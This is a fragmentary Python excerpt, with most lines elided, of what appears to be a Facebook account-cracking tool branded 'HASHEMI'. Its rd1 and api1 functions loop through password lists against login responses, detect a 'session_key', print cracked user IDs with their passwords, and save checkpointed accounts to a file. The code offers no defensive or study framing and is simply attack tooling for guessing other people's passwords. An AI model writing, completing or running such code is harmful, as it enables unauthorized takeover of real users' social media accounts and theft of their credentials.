...
def Main_ZIDI():
        ...
        if shm =='1':
            ...
            os.system('xdg-open https://www.facebook.com/profile.php?id=AHMAD.ANWARI.001
/?ref=share')
            Main_ZIDI()
        elif shm =='0':
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write('\r [HASHEMI]  %s|  OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        #print(f'\r\r\33[1m\33[1;35m [HASHEMI-CP] '+uid+' | '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'HASHEMI-CP.txt')
...
def api1(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    uid = str(po['uid'])
                    print('\r\r\033[1;32m [HASHEMI-OK] '+uid+' | '+pas)
